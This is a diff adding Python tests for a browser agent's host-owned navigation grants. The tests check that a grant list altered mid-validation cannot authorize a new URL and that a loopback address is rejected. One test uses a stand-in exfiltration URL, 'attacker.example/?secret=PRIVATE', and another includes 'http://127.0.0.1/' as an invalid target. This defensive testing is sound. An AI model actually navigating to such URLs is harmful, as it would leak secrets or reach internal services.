@@ -1,5 +1,7 @@
 """Host-owned Browser Read navigation grants, not model or page authority."""
 
+import threading
+
 import pytest
 
 from agentcore.browser import BrowserAgentComposition, BrowserConfig
@@ -281,6 +283,72 @@ def test_host_grants_clear_on_exception_and_invalid_batch_is_atomic():
     with pytest.raises(BrowserError) as error:
         authority.require(good)
     assert error.value.failure is BrowserFailure.NAVIGATION_NOT_AUTHORIZED
+
+
+def test_mutable_grants_are_snapshotted_before_validation_and_broker_io(monkeypatch, caplog):
+    from agentcore.browser import navigation_authority as authority_module
+    from agentcore.browser.session import BrowserSession
+
+    grants = [f"https://allowed.example/page-{index}" for index in range(16)]
+    appended = "https://attacker.example/?secret=PRIVATE"
+    entered, release = threading.Event(), threading.Event()
+    thread_errors = []
+    original_canonical_url = authority_module.canonical_url
+
+    def paused_canonical_url(url, *, max_chars):
+        if url == grants[0] and not entered.is_set():
+            entered.set()
+            assert release.wait(5), "mutator did not release canonicalization"
+        return original_canonical_url(url, max_chars=max_chars)
+
+    def append_during_validation():
+        try:
+            assert entered.wait(5), "canonicalization was not reached"
+            grants.append(appended)
+        except BaseException as error:
+            thread_errors.append(error)
+        finally:
+            release.set()
+
+    monkeypatch.setattr(authority_module, "canonical_url", paused_canonical_url)
+    mutator = threading.Thread(target=append_during_validation)
+    mutator.start()
+    authority = BrowserNavigationAuthority(max_url_chars=2048)
+    config = BrowserConfig(enabled=True)
+    broker = _Broker()
+    backend = BrokeredBrowserBackend(config, _broker=broker, _renderer=_Renderer())
+    try:
+        with BrowserSession(backend, config=config, navigation_authority=authority) as session:
+            with authority.for_turn(grants):
+                failure = None
+                failure_message = ""
+                try:
+                    session.open_url(appended)
+                except BrowserError as error:
+                    failure = error.failure
+                    failure_message = str(error)
+                assert broker.urls == []  # an appended URL must never reach SafeFetch
+                assert failure is BrowserFailure.NAVIGATION_NOT_AUTHORIZED
+                assert "PRIVATE" not in failure_message
+                assert len(authority._urls) == 16
+    finally:
+        release.set()
+        mutator.join(5)
+    assert not mutator.is_alive() and not thread_errors
+    assert len(grants) == 17
+    assert "PRIVATE" not in caplog.text
+
+
+def test_mutable_snapshot_over_limit_and_invalid_url_fail_atomically():
+    authority = BrowserNavigationAuthority(max_url_chars=2048)
+    allowed = "https://allowed.example/page"
+    for grants in ([allowed] * 17, [allowed, "http://127.0.0.1/"]):
+        with pytest.raises(BrowserError):
+            with authority.for_turn(grants):
+                pytest.fail("invalid snapshot was published")
+        with pytest.raises(BrowserError) as error:
+            authority.require(allowed)
+        assert error.value.failure is BrowserFailure.NAVIGATION_NOT_AUTHORIZED
 
 
 def test_navigation_authority_repr_and_serialization_hide_grants():
